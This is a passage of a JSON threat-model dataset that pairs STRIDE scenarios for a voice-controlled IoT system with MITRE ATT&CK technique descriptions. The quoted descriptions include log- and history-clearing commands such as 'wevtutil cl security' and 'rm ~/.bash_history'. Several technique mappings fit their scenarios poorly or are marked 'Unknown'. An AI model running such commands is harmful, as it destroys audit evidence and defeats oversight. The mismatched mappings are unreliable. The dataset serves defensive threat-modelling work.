                    "Assumption": "No mitigation or monitoring for application vulnerabilities.",
                    "Role": "Administrator",
                    "Condition": "Lack of regular updates and security monitoring."
                }
            ],
            "Potential Impact": "Complete service outage and inaccessibility of services.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "server crash",
                "application vulnerability",
                "system outage"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker blocks communication between the client-side application and the server.",
            "Assumptions": [
                {
                    "Assumption": "Network vulnerability or lack of redundancy.",
                    "Role": "Developer",
                    "Condition": "No alternative communication paths or failover mechanisms."
                },
                {
                    "Assumption": "The attacker has control over network devices.",
                    "Role": "Attacker",
                    "Condition": "Compromised routers, switches, or other network infrastructure."
                },
                {
                    "Assumption": "No network monitoring or anomaly detection.",
                    "Role": "Administrator",
                    "Condition": "Incomplete or nonexistent network security monitoring."
                }
            ],
            "Potential Impact": "Disruption of services and inability for users to interact with the system.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "network disruption",
                "communication blocking",
                "service interruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the client-side application to gain administrative rights.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities in the client-side application's privilege management.",
                    "Role": "Developer",
                    "Condition": "Lack of secure coding practices and inadequate testing."
                },
                {
                    "Assumption": "The attacker can identify and exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Access to the application and knowledge of exploitation techniques."
                },
                {
                    "Assumption": "No monitoring for unusual access patterns.",
                    "Role": "Administrator",
                    "Condition": "Insufficient logging and alerting mechanisms for privilege escalation attempts."
                }
            ],
            "Potential Impact": "Unauthorized administrative control over application features and data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "client-side vulnerability",
                "privilege escalation",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Component Object Model",
                "description": "Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.(Citation: Fireeye Hunting COM June 2019) Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)\n\nVarious COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: Microsoft COM) Specific COM objects also exist to directly perform functions beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, and other adversary behaviors related to privilege escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation: ProjectZero File Write EoP Apr 2018)",
                "id": "attack-pattern--2f6b4ed7-fef1-44ba-bcb8-1b4beb610b64",
                "technique_id": "T1559.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a weakness in IoT device communication to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "Weak security protocols in IoT device communication.",
                    "Role": "Developer",
                    "Condition": "Insufficient encryption or authentication measures."
                },
                {
                    "Assumption": "The attacker can intercept or manipulate IoT device communication.",
                    "Role": "Attacker",
                    "Condition": "Access to the network or communication channels."
                },
                {
                    "Assumption": "No sufficient authorization checks on device actions.",
                    "Role": "Developer",
                    "Condition": "Inadequate implementation of role-based access or security measures in the IoT framework."
                }
            ],
            "Potential Impact": "Unauthorized control and potentially dangerous physical actions by IoT devices.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "IoT communication",
                "security protocol weakness",
                "unauthorized control"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages cloud service misconfigurations to gain higher permissions.",
            "Assumptions": [
                {
                    "Assumption": "Misconfigurations or excessive permissions in cloud services.",
                    "Role": "Administrator",
                    "Condition": "Improperly defined access controls and policies."
                },
                {
                    "Assumption": "The attacker has access to the cloud environment.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials or lack of secure access mechanisms."
                },
                {
                    "Assumption": "No continuous monitoring or compliance checks.",
                    "Role": "Administrator",
                    "Condition": "Lack of ongoing review and updates to security policies."
                }
            ],
            "Potential Impact": "Expanded control over cloud-resident data and applications.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud misconfiguration",
                "permissions management",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Conditional Access Policies",
                "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\n\nFor example, in Azure AD, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. \n\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.",
                "id": "attack-pattern--ceaeb6d8-95ee-4da2-9d42-dc6aa6ca43ae",
                "technique_id": "T1556.009"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "16",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access by spoofing the user's voice commands.",
            "Assumptions": [
                {
                    "Assumption": "Voice recognition is not uniquely identifying the user's voice.",
                    "Role": "Attackers",
                    "Condition": "Attackers use voice recordings or mimicry."
                },
                {
                    "Assumption": "The system lacks multi-factor authentication.",
                    "Role": "System Design",
                    "Condition": "The application relies solely on voice-based authentication."
                },
                {
                    "Assumption": "Attackers have access to voice samples of the legitimate user.",
                    "Role": "Attackers",
                    "Condition": "The attacker has recorded the user's voice commands."
                }
            ],
            "Potential Impact": "Unauthorized access to IoT devices leading to potential physical security risks.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "voice recognition",
                "authentication",
                "IoT devices"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics the client-side application to send malicious commands to the server.",
            "Assumptions": [
                {
                    "Assumption": "Lack of proper validation of client-side requests.",
                    "Role": "System Design",
                    "Condition": "The server does not adequately verify the legitimacy of incoming requests."
                },
                {
                    "Assumption": "The attacker has access to network traffic to capture valid requests.",
                    "Role": "Attackers",
                    "Condition": "The attacker has network access to eavesdrop on data."
                },
                {
                    "Assumption": "There is no encryption in communication channels.",
                    "Role": "System Design",
                    "Condition": "The data between client and server is transmitted in plain text."
                }
            ],
            "Potential Impact": "Unauthorized commands sent to IoT devices, potentially causing harm or unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "command injection",
                "IoT controller"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker performs a man-in-the-middle attack, intercepting and altering voice commands.",
            "Assumptions": [
                {
                    "Assumption": "Lack of secure communication protocols.",
                    "Role": "System Design",
                    "Condition": "The application does not use HTTPS or secure WebSockets."
                },
                {
                    "Assumption": "The network topology is accessible to attackers.",
                    "Role": "Attackers",
                    "Condition": "The attacker can position themselves in the communication path."
                },
                {
                    "Assumption": "No encryption for voice data transmitted between components.",
                    "Role": "System Design",
                    "Condition": "Voice data is transmitted without encryption."
                }
            ],
            "Potential Impact": "Loss of data integrity and potential unauthorized manipulation of IoT devices.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "network",
                "voice commands"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the client-side application to send unauthorized voice commands.",
            "Assumptions": [
                {
                    "Assumption": "Client-side application lacks integrity checks.",
                    "Role": "System Design",
                    "Condition": "No validation or checksumming of the application's code."
                },
                {
                    "Assumption": "Attacker has physical or remote access to client devices.",
                    "Role": "Attackers",
                    "Condition": "The attacker can modify the application code or execute unauthorized binaries."
                },
                {
                    "Assumption": "Lack of application signing or certificate pinning.",
                    "Role": "System Design",
                    "Condition": "The application does not enforce proper security measures for code verification."
                }
            ],
            "Potential Impact": "Corruption of data and unauthorized commands affecting IoT devices' operations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code injection",
                "client-side",
                "voice commands"
            ],
            "mitre_technique": {
                "name": "File/Path Exclusions",
                "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.(Citation: Microsoft File Folder Exclusions)\n\nAdversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also use [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) and other [Discovery](https://attack.mitre.org/tactics/TA0007)/[Reconnaissance](https://attack.mitre.org/tactics/TA0043) activities to both discover and verify existing exclusions in a victim environment.",
                "id": "attack-pattern--09b008a9-b4eb-462a-a751-a0eb58050cd9",
                "technique_id": "T1564.012"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the firmware of IoT devices to perform unintended actions.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices do not have secure boot processes.",
                    "Role": "System Design",
                    "Condition": "The devices lack mechanisms to verify the integrity of boot firmware."
                },
                {
                    "Assumption": "Firmware updates are not authenticated or encrypted.",
                    "Role": "System Design",
                    "Condition": "The system does not implement secure firmware update processes."
                },
                {
                    "Assumption": "The attacker can intercept firmware updates.",
                    "Role": "Attackers",
                    "Condition": "The attacker has access to the network or device update channels."
                }
            ],
            "Potential Impact": "Loss of data integrity and potential physical damage or unauthorized actions by IoT devices.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "IoT devices",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies data between the client and server applications.",
            "Assumptions": [
                {
                    "Assumption": "Lack of encryption for data transmission.",
                    "Role": "System Design",
                    "Condition": "Sensitive data is transmitted without encryption."
                },
                {
                    "Assumption": "The communication channel is susceptible to interception.",
                    "Role": "System Design",
                    "Condition": "Network security measures are insufficient to prevent data interception."
                },
                {
                    "Assumption": "No integrity checking mechanisms are in place for data.",
                    "Role": "System Design",
                    "Condition": "Data integrity is not validated upon receipt."
                }
            ],
            "Potential Impact": "Data corruption and unauthorized commands being processed by the server.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data integrity",
                "network communication",
                "client-server"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a voice command that performed a critical action.",
            "Assumptions": [
                {
                    "Assumption": "Lack of proper logging and audit trails.",
                    "Role": "System Design",
                    "Condition": "The application does not maintain detailed logs of actions performed."
                },
                {
                    "Assumption": "No secure mechanism to link actions to user identities.",
                    "Role": "System Design",
                    "Condition": "The system does not reliably associate commands with specific users."
                },
                {
                    "Assumption": "Voice commands are not recorded for later verification.",
                    "Role": "System Design",
                    "Condition": "The system does not store audio of commands."
                }
            ],
            "Potential Impact": "Disputes over actions taken by the system, potentially compromising accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "audit trail",
                "user identity"
            ],
            "mitre_technique": {
                "name": "Rogue Domain Controller",
                "description": "Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)",
                "id": "attack-pattern--564998d8-ab3e-4123-93fb-eccaa6b9714a",
                "technique_id": "T1207"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An administrator denies modifying access permissions for IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "Lack of logging for administrative actions.",
                    "Role": "System Design",
                    "Condition": "Administrative actions are not logged or monitored."
                },
                {
                    "Assumption": "The system does not require secondary verification for critical actions.",
                    "Role": "System Design",
                    "Condition": "Critical administrative actions can be performed without verification."
                },
                {
                    "Assumption": "No audit trail linking administrators to their actions.",
                    "Role": "System Design",
                    "Condition": "Actions are not securely associated with individual administrators."
                }
            ],
            "Potential Impact": "Compromised accountability and potential unauthorized changes going undetected.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "administrative actions",
                "logging",
                "IoT devices"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious actor denies having sent commands that led to undesirable actions.",
            "Assumptions": [
                {
                    "Assumption": "Command logs do not include sender details.",
                    "Role": "System Design",
                    "Condition": "The logs do not capture the origin of commands accurately."
                },
                {
                    "Assumption": "System fails to timestamp actions linked to user identities.",
                    "Role": "System Design",
                    "Condition": "Actions are not correctly timestamped and associated with users."
                },
                {
                    "Assumption": "Voice commands are not archived for reference.",
                    "Role": "System Design",
                    "Condition": "The system does not store voice commands for later audit."
                }
            ],
            "Potential Impact": "Difficulty in tracking source of malicious actions, affecting security investigation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "user identity",
                "audit"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts voice command data during transmission.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not encrypted.",
                    "Role": "System Design",
                    "Condition": "Voice data is sent over plain channels without encryption."
                },
                {
                    "Assumption": "The network is accessible to the attacker.",
                    "Role": "Network Security",
                    "Condition": "The attacker has access to eavesdrop on the communication channel."
                },
                {
                    "Assumption": "Sensitive voice commands are transmitted frequently.",
                    "Role": "User Activity",
                    "Condition": "Users frequently transmit voice commands containing sensitive information."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive voice commands compromising user privacy.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data interception",
                "voice commands",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to stored voice command data in the cloud services.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage is not encrypted.",
                    "Role": "System Design",
                    "Condition": "Voice command data in the cloud is stored without encryption."
                },
                {
                    "Assumption": "Improper access controls on cloud services.",
                    "Role": "System Administration",
                    "Condition": "Cloud services have inadequate or misconfigured access controls."
                },
                {
                    "Assumption": "Stored voice command data includes sensitive information.",
                    "Role": "User Activity",
                    "Condition": "Users provide sensitive information via voice commands that is stored."
                }
            ],
